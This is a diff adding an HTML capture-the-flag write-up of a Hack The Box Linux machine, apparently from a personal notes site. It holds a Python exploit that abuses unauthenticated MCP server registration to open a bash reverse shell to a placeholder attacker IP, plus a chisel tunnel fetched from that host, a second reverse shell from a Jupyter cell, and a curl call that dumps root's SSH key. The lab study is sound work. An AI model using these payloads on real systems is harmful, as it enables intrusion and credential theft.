@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>DevHub — .d4nx0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-terminal"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>DevHub</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span> Week <span class="highlight">#2</span></div>
+            <div class="row"> Machine <span class="highlight">DevHub</span></div>
+            <div class="row"> OS <span class="highlight">Linux</span></div>
+            <div class="row"> Difficulty <span class="highlight">Medium</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">MCP RCE</span>] [<span class="highlight">Jupyter</span>] [<span class="highlight">API Key</span>] [<span class="highlight">SSH Key Dump</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>nmap -sS -sC -sV -p- -T4 -oN nmap-result.txt -oX nmap-result.xml <span class="ph">&lt;target-ip&gt;</span></code></pre>
+
+          <p><strong>Open Ports:</strong></p>
+          <ul>
+            <li><strong>22/tcp</strong> – SSH (OpenSSH 8.9p1 Ubuntu)</li>
+            <li><strong>80/tcp</strong> – HTTP (nginx 1.18.0 → redirects to <code>devhub.htb</code>)</li>
+            <li><strong>6274/tcp</strong> – HTTP (MCPJam Inspector)</li>
+          </ul>
+
+          <div class="callout info">
+            <strong>💡 Info</strong>
+            Register the hostname before browsing:
+            <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> devhub.htb' | sudo tee -a /etc/hosts</code></pre>
+          </div>
+
+          <p><strong>MCPJam Inspector</strong> is at <code>http://devhub.htb:6274</code>. Registration accepts a server config with arbitrary <code>command</code> / <code>args</code> — unauthenticated RCE.</p>
+
+          <div class="note-image">
+            <img src="../src/images/devhub/devhub-1.png" alt="MCPJam Inspector registration UI" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: MCPJam Inspector]</em>'">
+          </div>
+
+          <h2>2. Exploitation</h2>
+          <h3>Unauthenticated RCE via MCP Registration</h3>
+          <p>Intercepting registration traffic (Burp) shows the interesting fields:</p>
+          <ul>
+            <li><code>serverId</code></li>
+            <li><code>serverConfig.timeout</code></li>
+            <li><code>serverConfig.command</code> / <code>args</code> / <code>env</code></li>
+          </ul>
+
+          <div class="note-image">
+            <img src="../src/images/devhub/devhub-2.png" alt="Burp intercept of MCP registration" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Burp registration request]</em>'">
+          </div>
+
+          <p>Trigger a reverse shell with a simple POST:</p>
+          <pre><code>import requests
+import json
+
+target = "http://devhub.htb:6274"
+your_ip = "<span class="ph">&lt;attacker-ip&gt;</span>"
+your_port = "4444"
+
+payload = {
+    "serverId": "pwned",
+    "serverConfig": {
+        "timeout": 10000,
+        "command": "bash",
+        "args": ["-c", f"bash -i >& /dev/tcp/{your_ip}/{your_port} 0>&1"],
+        "env": {}
+    }
+}
+
+response = requests.post(
+    f"{target}/api/mcp/servers/reconnect",
+    json=payload,
+    headers={"Content-Type": "application/json"}
+)
+
+print(f"Status: {response.status_code}")
+print(f"Response: {response.text}")</code></pre>
+
+          <pre><code># terminal 1
+nc -lnvp 4444
+
+# terminal 2
+python3 exploit.py</code></pre>
+
+          <p>Shell lands as <code>mcp-dev</code>.</p>
+
+          <h3>Lateral Movement → <code>analyst</code> (Jupyter)</h3>
+          <p>Process listing shows a Jupyter Notebook owned by <code>analyst</code> on <code>127.0.0.1:8888</code> (not reachable externally).</p>
+
+          <div class="note-image">
+            <img src="../src/images/devhub/devhub-3.png" alt="Jupyter listening on 8888 as analyst" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Jupyter process]</em>'">
+          </div>
+
+          <p><strong>Port forward with SSH</strong> (if you already have <code>mcp-dev</code> keys/password):</p>
+          <pre><code>ssh -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb</code></pre>
+
+          <p><strong>Or with Chisel</strong> (no SSH creds needed):</p>
+          <pre><code># attacker
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
+python3 -m http.server
+./chisel_1.9.1_linux_amd64 server -p 8001 --reverse
+
+# target
+wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/chisel_1.9.1_linux_amd64 -O chisel
+chmod +x chisel
+./chisel client <span class="ph">&lt;attacker-ip&gt;</span>:8001 R:8888:127.0.0.1:8888</code></pre>
+
+          <p>Open <code>http://127.0.0.1:8888</code>, run in a notebook cell:</p>
+          <pre><code>import os
+os.system('whoami')
+# analyst
+
+# start listener: nc -lnvp 5555
+os.system('bash -c "bash -i >& /dev/tcp/<span class="ph">&lt;attacker-ip&gt;</span>/5555 0>&1"')</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/devhub/devhub-4.png" alt="Jupyter cell reverse shell as analyst" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Jupyter reverse shell]</em>'">
+          </div>
+
+          <pre><code>cd /home/analyst
+cat user.txt</code></pre>
+
+          <h2>3. Privilege Escalation</h2>
+          <h3>Root MCP Tool → SSH Key Dump</h3>
+          <p>A root-owned <code>/opt/opsmcp/server.py</code> exposes tools on port <strong>5000</strong>. Source reveals the API key, tool names, and that <code>ops._admin_dump</code> can return SSH keys.</p>
+          <pre><code>cat /opt/opsmcp/server.py
+# Bearer / X-API-Key, tool names, credentials hints, app on :5000</code></pre>
+
+          <pre><code>curl -s -X POST http://127.0.0.1:5000/tools/call \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
+  | python3 -c "import sys, json; print(json.load(sys.stdin)['root_private_key'].replace('\\n', '\n'))"</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/devhub/devhub-5.png" alt="Root SSH private key dumped via API" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: root key dump]</em>'">
+          </div>
+
+          <pre><code>ssh -i root.key root@devhub.htb
+cat /root/root.txt</code></pre>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>/home/analyst/user.txt</code></li>
+            <li><strong>Root flag:</strong> <code>/root/root.txt</code></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>✅ Lessons Learned</strong>
+            An unauthenticated MCP “server registration” that executes arbitrary <code>command</code>/<code>args</code> is straight RCE. From <code>mcp-dev</code>, a localhost Jupyter instance owned by <code>analyst</code> was one tunnel away from a second user shell. Finally, a root MCP admin tool protected only by a static API key dumped root’s SSH private key. Never expose debug/admin tool bridges without authz, and keep internal notebooks off shared hosts without strong binding controls.
+          </div>
+        </div>
+
+      </div>
+      <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','unzip','python3','sudo','nmap','ssh','ssh-keygen','curl','nc','echo','cat','cd','mkdir','chmod','gunzip','chisel','import','os','whoami','bash'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.parentElement && pre.parentElement.classList.contains('code-wrap')) return;
+      var wrap = document.createElement('div');
+      wrap.className = 'code-wrap';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copy';
+      btn.addEventListener('click', function () {
+        var code = pre.querySelector('code');
+        var text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
